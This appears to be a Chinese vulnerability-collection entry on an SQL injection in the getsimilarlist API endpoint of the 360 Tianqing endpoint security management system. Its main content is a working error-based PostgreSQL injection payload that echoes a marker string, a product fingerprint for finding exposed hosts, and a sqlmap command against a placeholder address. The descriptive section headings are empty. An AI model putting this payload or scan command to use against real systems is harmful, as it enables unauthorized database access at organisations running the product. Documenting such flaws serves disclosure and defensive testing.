# 360天擎终端安全管理系统getsimilarlist存在SQL注入漏洞

- **系统**：360天擎终端安全管理系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name=="天擎终端安全管理系统"`

**请求体 / payload**
```
响应中存在`qzbkq1qpzzq`表示可能存在漏洞
/api/client/getsimilarlist?status[0,1]=(CAST((CHR(113)CHR(122)CHR(98)CHR(107)CHR(113))(SELECT (CASE WHEN (8327=8327) THEN 1 ELSE 0 END))::text(CHR(113)CHR(112)CHR(122)CHR(122)CHR(113)) AS NUMERIC))&status[0]=1

sqlmap
python3 sqlmap.py  -u "https://xx.xx.xx.xx/api/client/getsimilarlist?status[0,1]=1&status[0]=1" --batch
```

**其他**
- 360天擎终端安全管理系统getsimilarlist存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 360天擎终端安全管理系统